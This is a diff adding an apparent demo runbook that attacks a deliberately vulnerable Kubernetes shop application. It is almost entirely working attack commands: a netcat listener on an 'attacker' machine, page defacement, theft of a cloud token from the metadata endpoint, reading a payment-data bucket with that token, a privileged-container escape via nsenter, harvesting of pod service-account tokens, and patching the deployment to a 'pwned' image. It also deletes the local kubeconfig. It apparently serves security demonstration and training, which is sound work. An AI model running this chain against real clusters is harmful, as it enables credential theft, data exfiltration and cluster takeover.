@@ -1,0 +1,72 @@
+# add the cluster to your local kubeconfig and remove old stuff
+rm ~/.kube/config # your laptop will forget custom clusters
+gcloud config set project kubeaudit-demo
+gcloud config set compute/zone europe-west1-c
+gcloud container clusters get-credentials kubeaudit-demo-cluster-eu
+
+# do this to save typing the project and zone each time
+gcloud config set project kubeaudit-demo
+gcloud config set compute/zone europe-west1-c
+
+# start the proxy
+./start-iap-proxy.sh
+
+# ssh into the attacker machine and start listening
+gcloud compute ssh attacker-eu
+killall nc
+nc -lkvnp 13370
+
+# make sure we reset the page first
+k delete po shop-web-<TAB>
+k apply -f shop-web-no-readonlyroot.yaml
+
+# pwn the page
+echo '<html><body>pwned</body></html>' > views/index.html
+
+# get token
+curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+
+# pull data
+gcloud storage --access-token-file=$PWD/token.txt cat gs://shop-demo-pci-keepout/data.csv
+
+# container escape with privileged + hostPID
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+
+# see containers
+cd /var/lib/kubelet/pods
+ls */containers
+
+cd /var/lib/kubelet/pods/<POD>
+find ./ -name token
+cat <PATH_TO_TOKEN>
+
+export TOKEN=<TOKEN>
+curl -k -H "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST
+
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://$KUBERNETES_SERVICE_HOST/apis/apps/v1/namespaces/default/deployments/shop-web \
+  -X PATCH \
+  -H 'Content-Type: application/merge-patch+json' \
+  -d '{
+  "spec": {
+    "template": {
+      "spec": {
+        "containers": [
+          {
+            "name": "shop-web",
+            "image": "danisantos/vuln-shop-demo-web-pwned:latest",
+            "imagePullPolicy": "Always",
+            "volumeMounts": [{
+                "mountPath": "/app/uploads",
+                "name": "uploads"
+              }, {
+                "mountPath": "/app/views/images/rendered",
+                "name": "rendered"
+              }
+            ]
+          }
+        ]
+      }
+    }
+  }
+}'
